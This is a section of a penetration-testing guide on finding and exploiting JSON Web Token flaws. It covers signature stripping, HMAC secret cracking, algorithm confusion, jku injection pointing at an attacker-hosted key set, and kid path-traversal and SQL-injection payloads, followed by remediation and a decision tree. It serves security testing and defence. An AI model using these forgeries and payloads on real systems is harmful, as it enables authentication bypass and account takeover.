## 2.13 JWT ATTACK DETECTION & EXPLOITATION

**═══ JSON WEB TOKEN (JWT) — COMPLETE DETECTION & EXPLOITATION ═══**

CWE: CWE-347 (Improper Verification of Cryptographic Signature) | CWE-345 | CWE-287
CVSS: 4.3–10.0 (auth bypass / privilege escalation → Critical)
OWASP: A07:2025 Authentication Failures | A08:2025 Software & Data Integrity Failures
Primary references: RFC 7519 (JWT), RFC 7515 (JWS), RFC 7517 (JWK), PortSwigger JWT Academy

### Overview

A JWT carries claims in three base64url segments — `header.payload.signature`. Security
depends entirely on the server *verifying* the signature with the correct key and the
correct algorithm before trusting any claim. Almost every real JWT vulnerability is a
failure of that verification step, not a break of the underlying crypto. The token is a
bearer credential: if verification can be skipped, weakened, or pointed at a
key the attacker controls, every claim (`sub`, `role`, `admin`, `scope`) becomes
attacker-controlled and the result is authentication bypass or privilege escalation.

Attack surface: any endpoint that accepts a token in `Authorization: Bearer`, a cookie, a
custom header, a query string, or a WebSocket subprotocol. Session tokens, password-reset
tokens, email-verification tokens, OAuth id_tokens/access_tokens, and inter-service (S2S)
tokens are all in scope.

### 2.13.1 Detection Methodology — First Contact

#### A. Recognise and decode

```
# A JWT is three dot-separated base64url blobs. Decode header + payload (NOT the signature):
echo 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIiwicm9sZSI6InVzZXIifQ.sig' \
  | cut -d. -f1,2 | tr '.' '\n' | while read p; do echo "$p===" | base64 -d 2>/dev/null; echo; done

# jwt_tool is the workhorse for the whole class:
python3 jwt_tool.py <TOKEN>                    # decode + highlight weaknesses
python3 jwt_tool.py <TOKEN> -T                 # tamper mode (interactive claim editing)
```

Record from the header: `alg` (HS256 / RS256 / ES256 / EdDSA / none), and any of
`kid`, `jku`, `x5u`, `x5c`, `jwk`, `cty`. Each of the latter is a potential injection point.

#### B. Baseline oracle test

Send three variants of one authenticated request and compare responses (status, body, timing):
1. Original valid token → note the "accepted" response.
2. Token with the **signature byte-flipped** (change one char of segment 3).
3. Token with the **payload changed** but original signature kept.

If (2) or (3) is still accepted, the server is not verifying the signature at all — the
highest-severity finding in this class. If only (3) with a *re-signed* token is accepted,
verification works and you move to key/algorithm attacks.

#### C. Automated sweep

```
# jwt_tool "all attacks" playbook against a live endpoint:
python3 jwt_tool.py -t https://target/api/me -rh "Authorization: Bearer <TOKEN>" -M at

# nuclei has JWT-specific templates (none-alg, weak-secret, alg-confusion):
nuclei -u https://target -t http/misconfiguration/jwt/ -H "Authorization: Bearer <TOKEN>"
```

### 2.13.2 Exploitation Techniques

#### T1 — `alg:none` / signature stripping (CWE-347)
Set the header algorithm to `none` (also try `None`, `NONE`, `nOnE` to defeat naive string
checks) and remove the signature segment, leaving the trailing dot.

```
python3 jwt_tool.py <TOKEN> -X a          # jwt_tool "alg:none" exploit, auto-forges variants
# Result header: {"alg":"none","typ":"JWT"}  Payload edited to {"role":"admin"}  Signature: (empty)
```
Confirmation: forged admin token is accepted → **P1 auth bypass**. Root cause: library
treats "none" as a valid algorithm, or verification is wrapped in a try/catch that
fails open.

#### T2 — Weak HMAC secret (CWE-345)
HS256 tokens are signed with a symmetric secret. If it's guessable, you can mint arbitrary
valid tokens offline.

```
# Crack the HMAC secret from a captured token:
hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt
john token.jwt --wordlist=jwt.secrets.list --format=HMAC-SHA256
# Then forge with the recovered secret:
python3 jwt_tool.py <TOKEN> -T -S hs256 -p 'recovered_secret'
```
Test known-default secrets first: `secret`, `changeme`, `your-256-bit-secret`, the framework
name, empty string. Confirmation: a token signed with the recovered secret is accepted → **P1**.

#### T3 — RS256→HS256 algorithm confusion (CWE-347)
If the server verifies RS256 with the public RSA key but a permissive library lets the
caller choose the algorithm, switch `alg` to HS256 and sign the token using the *public key
bytes as the HMAC secret*. The server "verifies" HS256 using its own public key — which you
have — so your forgery validates.

```
# Obtain the public key (JWKS endpoint, TLS cert, or reconstruct from two tokens):
python3 jwt_tool.py <TOKEN> -X k -pk public.pem      # jwt_tool key-confusion exploit
# If no key is published, derive the RSA modulus from two RS256 tokens:
#   github.com/silentsignal/rsa_sign2n  -> recovers n, produces candidate PEMs
```
Confirmation: forged HS256 token verifies → **P1 privilege escalation**.

#### T4 — `jku` / `x5u` header injection (SSRF + key substitution)
`jku`/`x5u` tell the server where to fetch the verification key. If unrestricted, point it
at a JWKS you host containing *your* public key, then sign with your matching private key.

```
# 1. Generate a keypair; publish JWKS at an attacker URL:
python3 jwt_tool.py <TOKEN> -X s                      # jwt_tool "jku" spoof helper
# 2. Forge header: {"alg":"RS256","jku":"https://attacker/jwks.json","kid":"..."}
# Bypass allowlists with:  jku pointing at an open-redirect on the trusted host,
#   or  https://trusted-host@attacker/  ,  or a path-traversal to a writable JWKS.
```
`x5u` (X.509 cert URL) and inline `jwk`/`x5c` headers are the same idea — attacker supplies
the key material inline. Confirmation: token signed with attacker key is accepted → **P1**;
even a *blind* SSRF callback to your `jku` host is a reportable finding on its own.

#### T5 — `kid` injection (path traversal / SQLi / command)
`kid` selects which key to use and is frequently concatenated into a file path or SQL query.

```
{"alg":"HS256","kid":"../../../../dev/null"}   # force key = empty file → sign with ""
{"alg":"HS256","kid":"/proc/sys/kernel/randomize_va_space"}  # force a predictable key value
{"alg":"HS256","kid":"key' UNION SELECT 'attacker_known_secret'-- -"}  # SQLi returns your key
```
Confirmation: server signs/verifies with a key you control → **P1**.

#### T6 — Claim & structural abuse (when signature IS verified)
- **`exp` handling**: replay an expired token; some servers accept `exp` as a string, or
  don't check it → session-does-not-expire.
- **`kid`/`iss`/`aud` cross-service confusion**: a token minted for service A accepted by
  service B (audience not validated) → lateral movement.
- **Nested/`cty:JWT`** and **JWE** decrypt-then-trust: see §2.54 (JWE).
- **Blank-password / null-signature edge cases**: `{"alg":"HS256"}` with empty secret.

### 2.13.3 Real-World CVEs (use as detection patterns)
- **CVE-2015-9235** (jsonwebtoken) — algorithm confusion RS256→HS256; the archetype.
- **CVE-2022-23529 / CVE-2022-23540** (node jsonwebtoken <9) — verification bypass / insecure
  defaults allowing `none` and key confusion.
- **CVE-2020-28042 / Auth0, Firebase-era libs** — `alg:none` acceptance.
- **CVE-2024-54150** (cjose) — algorithm-confusion class in a JOSE C library.
Pattern to flag in any target: a JWKS endpoint + tokens whose `alg` the client can influence.

### 2.13.4 Tooling
`jwt_tool` (primary: tamper, crack, all-attacks), `hashcat -m 16500` / `john` (secret
cracking), `rsa_sign2n` (recover RSA public key from tokens), Burp **JWT Editor** extension
(GUI signing/attacks, embedded JWK auto-inject), `nuclei` JWT templates.

### 2.13.5 Remediation & Verification
Fix: pin the algorithm server-side (never read `alg` from the token to choose the verifier);
use asymmetric (RS256/ES256/EdDSA) with a private signing key; reject `none`; ignore or
strictly allowlist `jku`/`x5u`/`jwk`/`kid`; validate `exp`, `nbf`, `iss`, `aud`; rotate keys;
use ≥256-bit random secrets for any HMAC use.

Verification re-tests (all must FAIL to be "fixed"):
1. `alg:none` forged token → rejected. 2. Payload-tampered, signature-kept → rejected.
3. RS256→HS256 confusion with public key as secret → rejected. 4. `jku` pointed off-domain →
no fetch / rejected. 5. Expired `exp` → rejected. 6. Cross-audience token → rejected.

### 2.13.6 Decision Tree — JWT

```
Token present?
 └─ Decode header → read alg + kid/jku/x5u/jwk
     ├─ Tamper payload, keep signature → ACCEPTED? ── YES → P1 (no verification) → REPORT
     │                                              └ NO ↓
     ├─ alg → none/None/NONE, strip sig → ACCEPTED? ─ YES → P1 (alg:none) → REPORT
     │                                              └ NO ↓
     ├─ alg = HS*  → crack secret (hashcat 16500) → cracked? ─ YES → forge → P1 → REPORT
     │                                                       └ NO ↓
     ├─ alg = RS*/ES* → try HS confusion w/ public key ─ ACCEPTED? ─ YES → P1 → REPORT
     │                                                             └ NO ↓
     ├─ jku/x5u/jwk present → inject attacker key/URL ─ ACCEPTED or SSRF callback? ─ YES → P1 → REPORT
     │                                                                            └ NO ↓
     ├─ kid present → path-traversal / SQLi in kid ─ key controllable? ─ YES → P1 → REPORT
     │                                                                 └ NO ↓
     └─ claim abuse: replay exp, swap aud/iss ─ accepted? ─ YES → P2/P3 → REPORT
                                                          └ NO → verification robust; document negative
```